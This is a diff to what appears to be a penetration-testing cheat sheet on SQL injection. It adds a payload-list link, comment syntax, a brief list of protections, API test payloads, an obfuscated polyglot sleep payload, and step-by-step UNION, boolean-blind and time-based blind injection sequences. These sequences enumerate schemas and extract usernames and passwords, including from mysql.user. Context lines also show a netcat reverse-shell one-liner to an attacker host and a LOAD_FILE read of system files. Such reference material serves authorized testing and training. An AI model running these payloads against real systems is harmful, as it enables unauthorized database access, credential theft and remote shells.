@@ -29,6 +29,7 @@
 | Cypher Injection Cheat Sheet | n/a | https://pentester.land/blog/cypher-injection-cheatsheet/#cypher-queries |
 | NoSQLMap | NoSQLMap is an open source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases and web applications using NoSQL in order to disclose or clone data from the database. | https://github.com/codingo/NoSQLMap |
 | SQL injection cheat sheet | This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. | https://portswigger.net/web-security/sql-injection/cheat-sheet |
+| SQL Injection Payload List | SQL Injection Payload List | https://github.com/payloadbox/sql-injection-payload-list |
 | sqlmap | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. | https://github.com/sqlmapproject/sqlmap |
 | sqlmap Websocket Proxy | Tool to enable blind sql injection attacks against websockets using sqlmap | https://github.com/BKreisel/sqlmap-websocket-proxy |
 
@@ -492,7 +493,30 @@ $ sqlcmd -S <RHOST> -U <USERNAME>
 
 ## SQL Injection
 
+> https://github.com/payloadbox/sql-injection-payload-list
+
 > https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
+
+### Comments
+
+```c
+#       // Hash comment
+/*      // C-style comment
+-- -    // SQL comment
+;%00    // Nullbyte
+`       // Backtick
+```
+
+### Wildcard Operators
+
+`%a` value starts with `a`
+`e%` value ends with `e`
+
+### Protection
+
+* Prepared Statements (Parameterized Queries)
+* Input Validation
+* Escaping User Input
 
 ### Master List
 
@@ -562,7 +586,7 @@ or true--
 " or "x"="x
 ") or ("x")=("x
 ")) or (("x"))=(("x
-or 2 like 2
+or 2 LIKE 2
 or 1=1
 or 1=1--
 or 1=1#
@@ -621,10 +645,24 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-### Payload
+### Testing APIs
 
 ```c
-SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<password>';
+{"id":"56456"}                   // ok
+{"id":"56456 AND 1=1#"}          // ok
+{"id":"56456 AND 1=2#"}          // ok
+{"id":"56456 AND 1=3#"}          // error
+{"id":"56456 AND sleep(15)#"}    // sleep 15 seconds
+```
+
+### Payloads
+
+```c
+SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWORD>';
+```
+
+```c
+1%27/**/%256fR/**/50%2521%253D22%253B%2523=="0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z",===query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login==' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
 ```
 
 #### Explanation
@@ -656,6 +694,69 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLUMN_NAME, 2,3 FROM i
 SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);-- %';
 ```
 
+### Manual In-Band SQL Injection
+
+> https://<RHOST>/article?id=3
+
+```c
+'    # causes error printed out on the page
+1 UNION SELECT 1
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3    # received a message about the columns
+0 UNION SELECT 1,2,3    # output from two tables
+0 UNION SELECT 1,2,database()    # received database name
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<DATABASE>'
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.columns WHERE table_name = '<TABLE>'
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM <TABLE>
+```
+
+### Manual Blind SQL Injection (Authentication Bypass)
+
+> https://<RHOST>/article?id=3
+
+```c
+0 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
+```
+
+### Manual Blind SQL Injection (BooleanBased)
+
+> https://<RHOST>/checkuser?username=admin
+
+```c
+admin123' UNION SELECT 1;--    # value is false
+admin123' UNION SELECT 1,2;--    # value is false
+admin123' UNION SELECT 1,2,3;--    # value changed to true
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--    # database name starts with "s"
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '<DATABASE>' AND table_name='users';--    # enumerating tables
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE table_schema='<DATABASE>' AND table_name='users' AND column_name LIKE 'a%';    # enumerating columns
+admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%    # query for a username which starts with "a"
+admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'ad%
+admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'adm%
+admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admi%
+admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admin%
+admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1%';--
+admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '12%';--
+admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '123%';--
+admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1234%';--
+```
+
+### Manual Blind SQL Injection (Time-Based)
+
+> https://<RHOST>/analytics?referrer=<RHOST>
+
+```c
+admin123' UNION SELECT SLEEP(5);--
+admin123' UNION SELECT SLEEP(5),2;--    # the query created a 5 second delay which indicates that it was successful
+admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
+admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'a%';--
+admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'ad%';--
+admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'adm%';--
+admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admi%';--
+admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admin%';--
+admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE 'a%';--
+```
+
 ### SQL Command Injection
 
 ```c
@@ -670,6 +771,14 @@ $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 
 ```c
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb' (URL encoded instead of spaces)
+```
+
+### SQL UNION Injection
+
+```c
+foobar" UNION SELECT NULL, NULL, @@hostname, @@version; #
+foobar" UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #
+foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
 ```
 
 ### List of Tables
@@ -742,7 +851,7 @@ SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
 
 ```c
 SELECT file_priv FROM mysql.user WHERE user = 'netspi'
-SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'
+SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
 ```
 
 ### Cipher Injection
